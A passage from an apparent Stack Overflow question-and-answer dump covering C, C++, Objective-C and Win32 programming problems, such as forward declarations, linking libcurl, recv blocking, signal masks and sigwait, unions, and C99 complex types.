    if ((self = [super init]))
    {
        for(int i = 0; i &lt; 16; i++)
            mat[i] = m-&gt;mat[i];
        // Nota bene: this loop can be replaced with a single call to memcpy
    }
    return self;
}
@end
</code></pre>
"
"<p>I have this method declaration in an interface:</p>

<pre><code>#import ""LotPolygon.h""

...

@interface LotLattice : NSObject {

... //member variables

}

- (LotPolygon *) lotPolygonContainingCoordinate:(CLLocationCoordinate2D)coord;

...

@end
</code></pre>

<p>The compiler gives this error for the method declaration:</p>

<blockquote>
  <p>Expected ')' before LotPolygon.</p>
</blockquote>

<p>If I comment it out, the code builds with the warning you'd expect (Lotlattice may not respond...) and functions and that method works just as it's supposed to. But that warning really bothers me because it makes it less likely that I'll see other warnings that I need to see. I'd really like it to compile with the proper declaration, and I just can't see anything wrong with that line.</p>

<p>I've even tried moving that line around in the file to see if it was really a line right before it that was pissing off Xcode, but no--It really doesn't like that line. Any ideas?</p>
","9530","","<p>That error means that the compiler doesn't know about the <code>LotPolygon</code> class.  Either include the header file that defines that class, or add a <em>forward declaration</em>:</p>

<pre><code>// This says that LotPolygon is the name of a class, but it doesn't define
// anything else about it
@class LotPolygon;

- (LotPolygon *) lotPolygonContainingCoordinate:(CLLocationCoordinate2D)coord;
</code></pre>
"
"<p>I have two lists of fixed-length tuples. This function calculates a fraction (ratio) for respective elements (note, <code>fX()</code> does not use comprehension for readability here).</p>

<pre><code>&gt;&gt;&gt; def fX(a,b):  
&gt;&gt;&gt;    c=[]  
&gt;&gt;&gt;    for i in range(len(a)):  
&gt;&gt;&gt;        c.append([a[i][x]/float(a[i][x]+b[i][x]) for x in range(len(a[i]))])
&gt;&gt;&gt;    return c  
</code></pre>

<p>When all values are non-zero, <code>fX()</code> works:  </p>

<pre><code>&gt;&gt;&gt; a[0]=(3, 4, 17, 9.6667, 6.6583, 0.4310, 1)  
&gt;&gt;&gt; b[0]=(4, 4, 12, 8.0, 3.2660, 0.0002, 1)  
&gt;&gt;&gt; fX(a,b)  
&gt;&gt;&gt; [[0.4286, 0.5, 0.5862, 0.5472, 0.6710, 0.9995, 0.5]]  
</code></pre>

<p>However, when any pair's values sum to zeros, <code>fX()</code> fails:  </p>

<pre><code>&gt;&gt;&gt; a[0]=(3, 4, 17, 9.6667, 6.6583, 0.4310, 0)  
&gt;&gt;&gt; b[0]=(4, 4, 12, 8.0, 3.2660, 0.0002, 0)  
&gt;&gt;&gt; fX(a,b)  
Traceback (most recent call last):  
  File ""&lt;pyshell#59&gt;"", line 1, in &lt;module&gt;  
    fX(a,b)  
  File ""&lt;pyshell#52&gt;"", line 4, in fX  
    c.append([a[i][x]/float(a[i][x]+b[i][x]) for x in range(len(a[i]))])  
ZeroDivisionError: float division  
</code></pre>

<p>I'm need a function, <code>fY()</code>, that gives this desired outcome without resorting to a brute force test of each value:  </p>

<pre><code>&gt;&gt;&gt; a[i]=(3, 4, 17, 9.6667, 6.6583, 0.4310, 0)  
&gt;&gt;&gt; b[i]=(4, 4, 12, 8.0, 3.2660, 0.0002, 0)  
&gt;&gt;&gt; fY()  
&gt;&gt;&gt; [[0.4286, 0.5, 0.5862, 0.5472, 0.6710, 0.9995, 0.0]]  
</code></pre>

<p>Thanks.</p>
","9530","","<p>Use the <code>a if x else b</code> ternary operator (equivalent to the C/C++/Java expression <code>x ? a : b</code>) to put the conditional inside the list comprehension.  This gives an efficient, Pythonic implementation:</p>

<pre><code>def fY(a, b):
    return [[aij/float(aij + bij) if aij+bij != 0 else 0 for aij, bij in zip(ai, bi)]
            for ai, bi in zip(a, b)]
</code></pre>
"
"<p>I have a very simple program below. </p>

<pre><code>#include&lt;stdio.h&gt;
void main(int argc, char *argv[])
{
  printf(""\n %s"",argv[3]);
}
</code></pre>

<p>Say the executable is named a.out and running it as $./a.out open path/to/my/file O_WRONLY|O_APPEND 
 gives  Command no found error.
where as running it as running it as $./a.out open path/to/my/file O_WRONLY
gives output O_WRONLY.</p>

<p>Is it because of |</p>

<p>Thanks for you valuable time.</p>
","9530","","<p>The pipe character <code>|</code> has a special meaning to the shell: it creates a <em>pipeline</em>, where the output of one process is piped into the input of another process.  When you type <code>foo | bar</code>, the shell spawns the two processes with command lines of <code>foo</code> and <code>bar</code> and connects the output of the former to the input of the latter.</p>

<p>To avoid this behavior, put quotes around your command line arguments:</p>

<pre><code>$ ./a.out open path/to/my/file ""O_WRONLY|O_APPEND""
</code></pre>
"
"<p>In cpp</p>

<pre><code>EBD_HEADER* pHeader;

pHeader = reinterpret_cast &lt;EBD_HEADER*&gt;(reinterpret_cast&lt;void*&gt;(const_cast &lt;char*&gt; (GetHeader())));
</code></pre>

<p>In Objective C</p>

<pre><code>EBD_HEADER* pHeader;

pHeader = (EBD_HEADER*)((void*)((char*)([self GetHeader])));
</code></pre>

<p>Why is these so many casts needed. Is it wrong to convert it into (EBD_HEADER*)[self GetHeader];</p>
","9530","","<p>You don't need that many casts in C/Objective-C, you should just use one cast for simplicity:</p>

<pre><code>pHeader = (EBD_HEADER*)[self GetHeader];
</code></pre>

<p>With C++-style casts, you need two casts because one casts away the <code>const</code>-ness and the other reinterprets the pointer to one type to a pointer to another type; the intermediate cast to <code>void*</code> is redundant and should be removed.</p>

<p>However, in this case, you should try to refactor the code so that you don't need any casts at all.  Why does <code>[self GetHeader]</code> return a <code>const char*</code> instead of an <code>EBD_HEADER*</code>?  Is the object returned actually constant?  If so, you should declare <code>pHeader</code> as <code>const EBD_HEADER*</code>, and you should not cast away the <code>const</code>-ness; if not, then <code>[self GetHeader]</code> should not return a <code>const</code> type.</p>
"
"<p>hello everyone I have some question about threads if for example I have some thread <code>1</code> which allocates some piece of the memory, and anohter thread (let's assume <code>2</code>) is killing thread <code>1</code> using pthread_cancel() or just using <code>return</code> what is going on with the peace of memory which it allocated? will be leak if thread <code>1</code> didn't free this piece of memory? thanks in advance for any answer</p>

<h3>edited</h3>

<p>just to make it clearer, as I know <code>pthread_cancel()</code> kills thread, but what is going on with its memory when I kill it? In case of <code>return</code> all thread will be dead if <code>1</code> is the main thread</p>
","9530","","<p>Yes, it will leak memory in that case.  C does not have any garbage collection -- if you allocate memory and fail to free it, it will be leaked, plain and simple.</p>

<p>If you want to avoid leaking memory, don't call <code>pthread_cancel</code>.  Make your threads exit gracefully by setting a flag asking them to exit, and then when they detect that that flag is set, they can free their memory and kill themselves by returning from their thread procedures or by calling <code>pthread_exit</code>.</p>

<p>Alternatively, you can set a thread cleanup handler by calling <a href=""http://pubs.opengroup.org/onlinepubs/007908799/xsh/pthread_cleanup_pop.html"" rel=""nofollow""><code>pthread_cleanup_push</code></a>, which will get called when your thread exits or gets canceled by a call to <code>pthread_cancel</code>.  You can use a handler function which will free any allocated memory you have outstanding.</p>
"
"<p>I have this simple code    </p>

<pre><code>#include &lt;stdio.h&gt;    
#include &lt;OpenGL/glext.h&gt;    
#include &lt;OpenGL/gl.h&gt;    

int main (int argc, const char * argv[])
{
    printf(""Hello, World!\n"");
    return 0;
}
</code></pre>

<p>If I comment out the line with ""glext.h"" it compiles and runs fine in xcode 4 if I uncomment that line I get 345 errors most of them 'expected * before *' ...
What is going on?! both gl.h and glext.h are inside the OpenGL framework but no matter if I incluhe it or not I get the same error. I tried GCC 4.2 as well as LLVM GCC 4.2 and LLVM (in this case 21 semantic and parse errors).</p>

<p>I am sure my lack of experience with C is causing this but I am surprised gl.h has no problem but glext.h has. </p>

<p>Even if I try to compile in from the command line by gcc I get lots of </p>

<pre><code>/System/Library/Frameworks/OpenGL.framework/Headers/glext.h:3137: error: expected ‘)’ before ‘const’
</code></pre>

<p>Any ideas?</p>
","9530","","<p>It's a bug with <code>glext.h</code>.  If you look at that file, you'll see that it has a bunch of definitions that use <code>GLenum</code>, but <code>GLenum</code> isn't defined anywhere in that file.  So, before you include <code>glext.h</code>, you need to include a file that defines <code>GLenum</code>.  The easiest thing to do is to include <code>gl.h</code> first instead of second:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;OpenGL/gl.h&gt;
#include &lt;OpenGL/glext.h&gt;
</code></pre>
"
"<p>I'm finding myself doing more C/C++ code against Win32 lately, and coming from a C# background I've developed an obsession with ""clean code"" that is completely consistent, so moving away from the beautiful System.* namespace back to the mishmash of #defines that make up the Win32 API header files is a bit of a culture shock.</p>

<p>After reading through MSDN's alphabetical list of core Win32 functions I realised how simple Win32's API design actually is, and it's unfortunate that it's shrouded with all the cruft from the past 25 years, including many references to 16-bit programming that are completely irrelevant in today's 64-bit world.</p>

<p>I'm due to start a new C/C++ project soon, and I was thinking about how I could recreate Win32's headers on an as-needed basis. I could design it to be beautiful, and yet it would maintain 100% binary (and source) compatibility with existing programs (because the #defines ultimately resolve the same thing).</p>

<p>I was wondering if anyone had attempted this in the past (Google turned up nothing), or if anyone wanted to dissuade me from it.</p>

<p>Another thing I thought of, was how with a cleaner C Win32 API, it becomes possible to design a cleaner and easier to use C++ Win32 API wrapper on top, as there wouldn't be any namespace pollution from the old C Win32 items.</p>

<p>EDIT:</p>

<p>Just to clarify, I'm not doing this to improve compilation performance or for any kind of optimisation, I'm fully aware the compiler does away with everything that isn't used. My quest here is to have a Win32 header library that's a pleasure to work with (because I won't need to depress Caps-lock every time I use a function).</p>
","9530","","<p>No.  What's the point?  Just include <code>&lt;windows.h&gt;</code>, and define a few macros like <code>WIN32_LEAN_AND_MEAN</code>, <code>VC_EXTRALEAN</code>, <code>NOGDI</code>, <code>NOMINMAX</code>, etc. to prune out the things you don't want/need to speed up your compile times.</p>
"
"<p>I'd like to build the latest version of gcc on a mac. Yes I have the latest xcode - I'm looking for some of the c++0x features that are in more recent versions (specifically, the lambda functions, but I'm sure other c++0x features will come in handy).</p>

<p>Are there any good step-by-step tutorials on doing this?</p>
","9530","","<p>One option is to install <a href=""http://www.macports.org/"">MacPorts</a> and install the <code>gcc46</code> package:</p>

<pre><code>sudo port install gcc46
</code></pre>

<p>Another option is to download the source code and build it as follows:</p>

<pre><code>tar xzvf gcc-4.6.0.tar.gz
cd gcc-4.6.0
./configure
make
</code></pre>

<p>Note that GCC 4.6.0 requires as prerequisites <a href=""http://gmplib.org/"">GMP</a> 4.2+, <a href=""http://www.mpfr.org/"">MPFR</a> 2.3.1+, and <a href=""http://www.multiprecision.org/"">MPC</a> 0.8.0+.  If <code>./configure</code> fails, it's probably because you're missing one of these (though it should give you a helpful error message in any case).</p>

<p>Building will take a while—likely several hours, depending on your hardware.</p>
"
"<pre><code>long long int
</code></pre>

<p>It seems to be valid in C. but is this valid in c++?</p>
","9530","","<p>The data type <code>long long int</code> is valid only in the C99 and C++0x language standards, it is not valid in C90 or C++03.  Some compilers such as GCC permit it to be used in those earlier language versions as an extension—when compiling as C90.  GCC will give a warning on its usage if both the <code>-Wlong-long</code> and <code>-pedantic</code> options are specified.</p>
"
"<p>In an embedded environment, for example, I declared a look-up table in following way:</p>

<pre><code>const Operation Vehicle_OpNotification[] =
{
  { OP_SET            , &amp;Vehicle_Notification_Set},
  { OP_GET            , &amp;Vehicle_Notification_Get}
};
</code></pre>

<p>May I know this function pointer is pointing to RAM address or ROM address?</p>
","9530","","<p>That depends on your compiler and target environment, but most likely it points to ROM—executable code is almost always placed in read-only memory when available.  You have to take special steps (like using a custom linker script or allocating dynamic memory and asking the operating system to mark it as writable and executable) to get executable code in non-read-only memory.</p>
"
"<p>I'd like to create a unique temporary directory in Windows from some C
code (not C++ or C#). I want to do this so that I can put some temp
files in the directory, and then delete them all easily when I'm done
(by removing the directory recursively).</p>

<p>I'm essentially looking for an equivalent of the linux
<a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/mkdtemp.html""><code>mkdtemp</code></a>
function. There is a C# answer <a href=""http://stackoverflow.com/questions/278439/creating-a-temporary-directory-in-windows"">here</a>, and responses on <a href=""http://stackoverflow.com/questions/3379956/how-to-create-a-temporary-directory-in-c"">this
question</a>
suggest using Boost. But since I'm using C, those solutions don't work
for me.</p>

<p>The best I've been able to come up with so far is to use
<a href=""http://msdn.microsoft.com/en-us/library/aa364991%28v=vs.85%29.aspx""><code>GetTempFileName</code></a>
followed by <a href=""http://msdn.microsoft.com/en-us/library/aa363855%28v=vs.85%29.aspx""><code>CreateDirectory</code></a>,
but the problem there is that if I ask
<a href=""http://msdn.microsoft.com/en-us/library/aa364991%28v=vs.85%29.aspx""><code>GetTempFileName</code></a>
to create a unique file name, it will also create the file (which I
don't want, since I want to make a directory instead).</p>

<p>Relatedly, there's
<a href=""http://msdn.microsoft.com/en-us/library/aa364992%28v=vs.85%29.aspx""><code>GetTempPath</code></a>,
which returns the location of the user's temp folder from environment
variables - but since I want to create my own directory that I can
safely delete later, I still need to create a directory inside any
path it would return.</p>

<p>It looks like if I want a unique directory to be created, I'll have to
create a temp file, get the name, delete it, and then create a
directory with the same name - which sounds very messy.
Any other ideas?</p>
","9530","","<p>Use <a href=""http://msdn.microsoft.com/en-us/library/hs3e7355%28v=vs.80%29.aspx"" rel=""nofollow""><code>_tempnam</code></a> <a href=""http://msdn.microsoft.com/en-us/library/18x8h1bh%28v=vs.80%29.aspx"" rel=""nofollow""><code>tmpnam_s</code></a> to create a filename that doesn't exist yet, and then use <a href=""http://msdn.microsoft.com/en-us/library/aa363855%28v=vs.85%29.aspx"" rel=""nofollow""><code>CreateDirectory</code></a> to create the directory.  There's technically a race condition if you do this, in that another process could potentially create a file or directory with that name in the time in between when you generate the filename and when you create the directory, but the odds of that are rather unlikely.  To protect against that, you can loop until you succeed.</p>

<p>For recursively removing a directory tree, you can use <a href=""http://msdn.microsoft.com/en-us/library/bb762164%28v=vs.85%29.aspx"" rel=""nofollow""><code>SHFileOperation</code></a>.  Alternatively, you can do the directory traversal yourself with <a href=""http://msdn.microsoft.com/en-us/library/aa364418%28v=vs.85%29.aspx"" rel=""nofollow""><code>FindFirstFile</code></a>/<a href=""http://msdn.microsoft.com/en-us/library/aa364428%28v=vs.85%29.aspx"" rel=""nofollow""><code>FindNextFile</code></a>, <a href=""http://msdn.microsoft.com/en-us/library/aa363915%28v=vs.85%29.aspx"" rel=""nofollow""><code>DeleteFile</code></a>, and <a href=""http://msdn.microsoft.com/en-us/library/aa365488%28v=vs.85%29.aspx"" rel=""nofollow""><code>RemoveDirectory</code></a>.</p>

<p>If you want to remove the directory automatically upon exiting, register a function using <a href=""http://msdn.microsoft.com/en-us/library/tze57ck3%28v=vs.80%29.aspx"" rel=""nofollow""><code>atexit</code></a>.  This will only work for normal program termination (i.e. via the <code>exit</code> function or via returning from <code>main</code>/<code>WinMain</code>).  This will not work for abnormal program termination (e.g. via <code>abort</code>, an access violation, someone else calling <code>TerminateProcess</code>, etc.).</p>
"
"<p>I need to use libcurl in a piece of software I am writing on my ubuntu machine. I am using Eclipse to write and compile all of the software. When I put the libcurl files in the same folder as the .cpp file, and include the curl.h file in the header, When I attempt to compile the program, It comes up with these errors:</p>

<pre><code>Building target: sms
Invoking: GCC C++ Linker
g++  -o""sms""  ./src/sms.o   
./src/sms.o: In function `main':
/home/geekman/workspace/sms/Debug/../src/sms.cpp:38: undefined reference to `curl_easy_init'
/home/geekman/workspace/sms/Debug/../src/sms.cpp:42: undefined reference to `curl_easy_setopt'
/home/geekman/workspace/sms/Debug/../src/sms.cpp:44: undefined reference to `curl_easy_setopt'
/home/geekman/workspace/sms/Debug/../src/sms.cpp:46: undefined reference to `curl_easy_perform'
/home/geekman/workspace/sms/Debug/../src/sms.cpp:47: undefined reference to `curl_easy_cleanup'
collect2: ld returned 1 exit status
make: *** [sms] Error 1
</code></pre>

<p>I took the contents of the include folder from libcurl, and placed them in the same folder as the .cpp file. then in the header of the .cpp file, I typed:</p>

<pre><code>#include &lt;curl/curl.h&gt;
</code></pre>

<p>I also tried:</p>

<pre><code>#include ""curl/curl.h""
</code></pre>

<p>Any ideas on the problem? Thanks.</p>
","9530","","<p>Your header file inclusions are just fine; your problem is occurring at the linking step.  In order to link against libcurl, you need to add the <code>-lcurl</code> command line option, assuming it's installed in a standard directory:</p>

<pre><code>g++ -o sms ./src/sms.o -lcurl
</code></pre>

<p>If it's not installed in a standard directory, you also need to add the <code>-L/path/to/libcurl</code>, e.g. something like:</p>

<pre><code># Assuming that /home/geekman/workspace/libcurl is where libcurl.a is located
g++ -o sms ./src/sms.o -L/home/geekman/workspace/libcurl -lcurl
</code></pre>

<p>Also note that the <code>-lcurl</code> option has to appear <em>after</em> the list of object files you're linking, otherwise it won't link properly.</p>
"
"<p>I'm having a problem where calling recv() system call does not block. I have a client-server structure setup at the moment, and the problem I am having is I send the server one message, while the server is set up so that it's something like:</p>

<pre><code>while (1) {
   char buf[1024];
   recv(fd, buf, sizeof(buf), flags);
   processMsg(buf);
}
</code></pre>

<p>It receives the first message correctly, but the recv() does not block and ""receives"" trash data which is not what is desired. I'd like to react to messages only when they are sent. Can anyone advise? </p>
","9530","","<p>There's two possibilities: either an error is occurring, or the socket is set to non-blocking mode.  To see if an error is occurring, check the return value of <code>recv</code>:</p>

<pre><code>while() {
    char buf[1024];
    int ret = recv(,buf,,)

    if(ret &lt; 0) {
        // handle error
        printf(""recv error: %s\n"", strerror(errno));
    } else {
        // only use the first ret bytes of buf
        processMsg(buf, ret);
    }
}
</code></pre>

<p>To put the socket into non-blocking mode, or to query if a socket is in non-blocking mode, use <a href=""http://linux.die.net/man/2/fcntl"" rel=""nofollow""><code>fcntl(2)</code></a> with the <code>O_NONBLOCK</code> flag:</p>

<pre><code>// Test if the socket is in non-blocking mode:
if(fcntl(sockfd, F_GETFL) &amp; O_NONBLOCK) {
    // socket is non-blocking
}

// Put the socket in non-blocking mode:
if(fcntl(sockfd, F_SETFL, fcntl(sockfd, F_GETFL) | O_NONBLOCK) &lt; 0) {
    // handle error
}
</code></pre>

<p>Note that unless you're explicitly changing the blocking behavior, the socket should be blocking by default, so most likely an error is occurring.</p>
"
"<blockquote>
  <p>If no signal in
         set is pending at the time of the call, the thread shall be
  suspended until one or more becomes
  pending. The signals defined by set
  shall have been blocked  at  the
         time of the call to sigwait(); otherwise, the behavior is undefined.
  The effect of sigwait() on the signal
  actions for the signals in set is
  unspecified.</p>
</blockquote>

<p>This is really ambiguous ,what's the difference between <code>pending</code> and <code>block</code> here?</p>

<p>And its conclusion on how to choose between <code>sigwait</code> and <code>sigaction</code> is not clear at all:</p>

<blockquote>
  <p>In summary, when it is necessary for
  code run in response to an
  asynchronous signal to notify a
  thread, sigwait() should be used  to 
  handle  the  signal.  Alterna-
         tively,  if the implementation provides semaphores, they also can be
  used, either following sigwait() or
  from within a signal handling routine
  previously registered
         with sigaction().</p>
</blockquote>

<p>Can someone make the reason of <code>sigwait</code> more rational?</p>
","9530","","<p>Every process has what's called a <em>signal mask</em> associated with it, which defines the set of signals which are <em>blocked</em>.  The signal mask can be queried or set with <a href=""http://linux.die.net/man/2/sigprocmask""><code>setprocmask(2)</code></a> (for single-threaded code) and <a href=""http://linux.die.net/man/3/pthread_sigmask""><code>pthread_sigmask(3)</code></a> (for multithreaded code).</p>

<p>Whenever a signal is raised (either explicitly via <a href=""http://linux.die.net/man/2/kill""><code>kill(2)</code></a> or <a href=""http://linux.die.net/man/3/raise""><code>raise(3)</code></a>, or via some other mechanism such as a segmentation fault raising <code>SIGSEGV</code>), the signal is checked against the current signal mask.  If the signal is not blocked, then it is acted upon immediately: the corresponding signal handler is called if set, otherwise the default action (typically exiting with abnormal status or ignoring it) is run.  If the signal is blocked by the signal mask, then the state of the signal is set to <em>pending</em>, and the program continues execution.</p>

<p>So consider the following example program:</p>

<pre><code>#include &lt;signal.h&gt;
#include &lt;stdio.h&gt;

void on_sigusr1(int sig)
{
  // Note: Normally, it's not safe to call almost all library functions in a
  // signal handler, since the signal may have been received in a middle of a
  // call to that function.
  printf(""SIGUSR1 received!\n"");
}

int main(void)
{
  // Set a signal handler for SIGUSR1
  signal(SIGUSR1, &amp;on_sigusr1);

  // At program startup, SIGUSR1 is neither blocked nor pending, so raising it
  // will call the signal handler
  raise(SIGUSR1);

  // Now let's block SIGUSR1
  sigset_t sigset;
  sigemptyset(&amp;sigset);
  sigaddset(&amp;sigset, SIGUSR1);
  sigprocmask(SIG_BLOCK, &amp;sigset, NULL);

  // SIGUSR1 is now blocked, raising it will not call the signal handler
  printf(""About to raise SIGUSR1\n"");
  raise(SIGUSR1);
  printf(""After raising SIGUSR1\n"");

  // SIGUSR1 is now blocked and pending -- this call to sigwait will return
  // immediately
  int sig;
  int result = sigwait(&amp;sigset, &amp;sig);
  if(result == 0)
    printf(""sigwait got signal: %d\n"", sig);

  // SIGUSR1 is now no longer pending (but still blocked).  Raise it again and
  // unblock it
  raise(SIGUSR1);
  printf(""About to unblock SIGUSR1\n"");
  sigprocmask(SIG_UNBLOCK, &amp;sigset, NULL);
  printf(""Unblocked SIGUSR1\n"");

  return 0;
}
</code></pre>

<p>Output:</p>

<pre><code>SIGUSR1 received!
About to raise SIGUSR1
After raising SIGUSR1
sigwait got signal: 30
About to unblock SIGUSR1
SIGUSR1 received!
Unblocked SIGUSR1
</code></pre>
"
"<pre><code>class C {
  using namespace std;  // error
};
namespace N {
  using namespace std; // ok
}
int main () {
  using namespace std; // ok
}
</code></pre>

<p><strong>Edit</strong>: Want to know motivation behind it.</p>
","9530","","<p>Because the C++ standard explicitly forbids it.  From C++03 §7.3.4 [namespace.udir]:</p>

<pre>
<i>using-directive</i>:
    using namespace ::<sub>opt</sub> <i>nested-name-specifier</i><sub>opt</sub> <i>namespace-name</i> ;
</pre>

<blockquote>
  <p>A <em>using-directive</em> shall not appear in class scope, but may appear in namespace scope or in block scope. [Note: when looking up a namespace-name in a using-directive, only namespace names are considered, see 3.4.6. ]</p>
</blockquote>

<p>Why does the C++ standard forbid it?  I don't know, ask a member of the ISO committee that approved the language standard.</p>
"
"<p>Which objective-c type is appropriate for handling money? I need something which is Core Data compatible. </p>
","9530","","<p>There are two solutions:</p>

<ul>
<li>Use an <code>int</code>, and always keep track of monetary values in cents (or the smallest possible division of whatever currency you're using).  Use only integer calculations.</li>
<li>Use <a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSDecimalNumber_Class/Reference/Reference.html""><code>NSDecimalNumber</code></a>, which does exact decimal arithmetic.</li>
</ul>

<p>Solution #1 requires you to convert between cents and dollars whenever you do input or output of monetary values, whereas solution #2 can be messier to code (e.g. you have to write something like <code>[num1 decimalNumberByAdding:num2]</code> instead of <code>num1 + num2</code> to add two numbers).</p>

<p>I'd recommend solution #1, but go with whichever of those you think would work best.</p>
"
"<pre><code>typedef union epoll_data
{
  void        *ptr;
  int          fd;
  __uint32_t   u32;
  __uint64_t   u64;
} epoll_data_t;
</code></pre>

<p>Here <code>int</code> and <code>__uint32_t</code> are 4 bytes,while the others are 8 bytes.</p>

<p>When we set <code>fd</code> to an <code>int</code>,does it lie on the first 4 bytes or the last 4 bytes,or does it depend on endianness?</p>

<p>Some reason is appreciated.</p>
","9530","","<p>It lies on the first 4 bytes.  From the C99 standard §6.7.2.1/14:</p>

<blockquote>
  <p>The size of a union is sufficient to contain the largest of its members. The value of at most one of the members can be stored in a union object at any time. A pointer to a union object, suitably converted, points to each of its members (or if a member is a bit-field, then to the unit in which it resides), and vice versa.</p>
</blockquote>

<p>This implies that the address of all members of a union is the same.</p>
"
"<p>There is a function called <code>_aligned_malloc</code> which can allocate aligned memory. Is there a similar function for <code>calloc</code>? I want to align and initialize it to zero. I am using visual studio 2010</p>
","9530","","<p>No, but you can roll your own pretty easily:</p>

<pre><code>void *_aligned_calloc(size_t nelem, size_t elsize, size_t alignment)
{
    // Watch out for overflow
    if(elsize == 0 || nelem &gt;= SIZE_T_MAX/elsize)
        return NULL;

    size_t size = nelem * elsize;
    void *memory = _aligned_malloc(size, alignment);
    if(memory != NULL)
        memset(memory, 0, size);
    return memory;
}
</code></pre>
"
"<p>I know what imaginary and complex numbers are in the math world but what about in c++, what are data types of complex and imaginary. In addition, I see data types such as _Imaginary and _Complex. What is the difference and what are complex and imaginary data types. </p>
","9530","","<p><code>_Imaginary</code> and <code>_Complex</code> are keywords in the C99 language standard used for defining imaginary and complex floating-point variable types; they are not part of the C++ language.  They are not data types in and of themselves -- they modify the <code>float</code>, <code>double</code> and <code>long double</code> types.  For example:</p>

<pre><code>float _Imaginary x;      // imaginary 32-bit number
double _Complex y;       // complex 64-bit number
long double _Complex z;  // complex 80-bit number
</code></pre>

<p><code>_Imaginary</code> values are mostly equivalent to regular real values, except when you add a real with an imaginary value, you get a <code>_Complex</code> value.</p>

<p>The header file <code>&lt;complex.h&gt;</code> defines the macros <code>imaginary</code> as <code>_Imaginary</code> and <code>complex</code> as <code>_Complex</code>, as well as <code>I</code> as either <code>_Complex_I</code> or <code>_Imaginary_I</code> (the imaginary unit).  This is so that legacy C programs can use <code>complex</code> and <code>imaginary</code> as identifiers; new programs should use <code>complex</code> and <code>imaginary</code> instead of <code>_Complex</code> and <code>_Imaginary</code>.  Note that identifiers beginning with an underscore followed by an uppercase letter are reserved by the implementation, so legacy code should never use <code>_Complex</code> or <code>_Imaginary</code>.</p>

<p>C++, on the other hand, does not use this, and instead has the templated types <code>std::complex&lt;float&gt;</code>, <code>std::complex&lt;double&gt;</code>, and <code>std::complex&lt;long double&gt;</code> for dealing with complex numbers.  Those classes function very similarly to the C99 types but are non-interchangeable.</p>
"
"<p>I'm using Visual Studio 2010, and I'm trying to run a simple program written in C, but I get tons of syntax errors when I F5 it. Almost all of them are because of this:</p>

<pre><code>syntax error: missing ';' before 'type'.
</code></pre>

<p>Here's how my main function looks:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
{
    printf(""Enter base 10 num: "");
    int value; scanf(""%d"", &amp;value);
    printf(""Enter base floor (min 2): "");
    int min; scanf(""%d"", &amp;min);
    printf(""Enter base ceiling (max 10): "");
    int max; scanf(""%d"", &amp;max);
    base_convert(value, min, max);
    return 0;
}
</code></pre>

<p>The first int value you see is line 12, and VS2010's first error is reported at line 12, char 1, which is the location of that int. Following the message that reports I'm missing a "";"" (which I'm clearly not), it then goes on to tell me that value is undeclared.</p>

<p>How do I fix this? I know that my program doesn't actually have syntax (or any) errors - this was previously written and tested to work on Ubuntu with GCC compiler.</p>

<p>Can someone help? This is extremely frustrating :S</p>
","9530","","<p>ANSI C does not allow variables to be defined in the middle of a block—they must be defined at the top of the block.  The later C99 standard removes this restriction (like C++ does), but Visual Studio does not support C99.</p>

<p>Rewrite your function with the variable declarations at the top:</p>

<pre><code>int main()
{
    int value, min, max;
    printf(""Enter base 10 num: "");
    scanf(""%d"", &amp;value);
    printf(""Enter base floor (min 2): "");
    scanf(""%d"", &amp;min);
    printf(""Enter base ceiling (max 10): "");
    scanf(""%d"", &amp;max);
    base_convert(value, min, max);
    return 0;
}
</code></pre>

<p>GCC, as an extension, allows variables to be defined in the middle of the block by default.  If you specify the <code>-pedantic</code> command line option (without <code>-std=c99</code>), you will get the following warning:</p>

<pre><code>warning: ISO C90 forbids mixed declarations and code
</code></pre>
"
"<p>I have search &amp; searched MSDN to find the definition of the HRESULT error with the value 80041318 but I cannot find it.</p>

<p>I am working in C++ Win32 attempting to schedule a task that will execute when the current user logs in. The function RegisterTaskDefinition() fails &amp; returns this value.</p>

<p>Does anyone know what this error means &amp; if possible does anyone know of the MSDN link to ALL the HRESULT ERRORS? I can find one link that has definitions of 7 errors.</p>
","9530","","<p>The <a href=""http://www.microsoft.com/downloads/en/details.aspx?FamilyId=BE596899-7BB8-4208-B7FC-09E02A13696C"" rel=""nofollow"">Microsoft Exchange Server Error Code Look-up</a> tool can be used to look up error codes.  Don't let the name fool you—it's not just for Exchange, it's useful for program that generates Win32 error codes or HRESULTs.  It searches all of the system header files for potential matches.</p>

<p>To look up error code 80041318, just run it from the command line like so:</p>

<pre><code>C:\&gt; err 80041318
</code></pre>

<p>In this case, a quick <a href=""http://google.com/search?q=80041318"" rel=""nofollow"">search</a> yields <a href=""http://msdn.microsoft.com/en-us/library/aa383604%28v=vs.85%29.aspx"" rel=""nofollow"">this MSDN page</a>, which says that error 80041318 is <code>SCHED_E_INVALIDVALUE</code>: ""The task XML contains a value which is incorrectly formatted or out of range.""</p>
"
"<p>My code:</p>

<p>dll:</p>

<pre><code>#include ""stdafx.h""
#include &lt;iostream.h&gt;

extern ""C"" __declspec(dllexport) void F1()
{
    cout &lt;&lt; ""It works\n"";
}

extern ""C"" __declspec(dllexport) int F2()
{
    return 154827;
}

extern ""C"" __declspec(dllexport) void F3(int n)
{
    cout &lt;&lt; ""It works: ""&lt;&lt;n&lt;&lt;""\n"";
}

extern ""C"" __declspec(dllexport) int F4(int n)
{
    return n+1;
}
</code></pre>

<p>console application:</p>

<pre><code>#include ""stdafx.h""
#include &lt;windows.h&gt;
#include &lt;iostream.h&gt;
#include &lt;stdio.h&gt;
#include &lt;conio.h&gt;

typedef void (WINAPI*f1)();
typedef int (WINAPI*f2)();
typedef void (WINAPI*f3)(int);
typedef int (WINAPI*f4)(int);

#define MAXMODULE 50

f1 F1;
f2 F2;
f3 F3;
f4 F4;

void main(int argc, char* argv[])
{
    HINSTANCE hLib=LoadLibrary(""dllll.dll"");

    if(hLib==NULL)
    {
        cout &lt;&lt; ""Unable to load library!"" &lt;&lt; endl;
        getch();
        return;
   }

    char mod[MAXMODULE];

   GetModuleFileName((HMODULE)hLib, (LPTSTR)mod, MAXMODULE);
   cout &lt;&lt; ""Library loaded: "" &lt;&lt; endl;


    F1=(f1)GetProcAddress((HMODULE)hLib, ""F1"");
    F2=(f2)GetProcAddress((HMODULE)hLib, ""F2"");
    F3=(f3)GetProcAddress((HMODULE)hLib, ""F3"");
    F4=(f4)GetProcAddress((HMODULE)hLib, ""F4"");

